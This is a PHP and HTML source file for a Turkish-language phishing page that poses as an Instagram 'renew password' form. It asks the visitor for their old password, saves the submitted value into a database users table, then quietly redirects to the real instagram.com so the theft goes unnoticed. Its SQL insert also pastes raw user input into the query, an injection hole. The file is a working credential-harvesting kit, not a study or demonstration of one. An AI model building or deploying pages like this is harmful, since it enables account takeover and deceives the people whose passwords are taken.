<?php 
include("DBconn.php");

if(isset($_POST["button"])) {

    if(empty($_POST["password"])) {

    } else 
    {
        $pass = $_POST["password"];

        $sql = "INSERT INTO users (password) VALUES ('$pass')";

        $sql_add = mysqli_query($sql_conn, $sql);

        header("Refresh: 0.7; URL=https://www.instagram.com/");

        mysqli_close($sql_conn);
    }
}


?>



<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="change.css" />
    <title>Şifreyi Yenile • Instagram</title>
    <link rel="icon" href="image/png" type="insta-fav.ico" />

</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="Black-Lock-Logo.jpeg" alt="Kilit Logo" title="Kilit logo" />
                </h1>
                <p class="login-help-text">Güçlü Bir Şifre Oluştur</p>
                <p class="additional-info">
                    Şifren en az 6 karakter uzunluğunda olmalı ve rakamlar, harfler.
                    ve özel karakterlerden (!$@%) <br> oluşmalıdır.
                </p>
                <form action="main.php" method="POST">
                    <label for="password" class="sr-only">Şifre</label>
                    <input name="password" type="password" placeholder="Önceki şifre" class="border border-danger form-control-sm" />

                    <label for="password" class="sr-only">Şifre</label>
                    <input name="" type="password" placeholder="Yeni şifre" class="border border-danger form-control-sm" />

                    <button name="button" type="submit">Şifreyi yenile</button>
                </form>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                    </div>

                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Hesabın yok mu?</p>
                <a href="https://www.instagram.com/accounts/emailsignup/">Kaydol</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
            </div>
        </section>
    </main>  
</body>
</html>
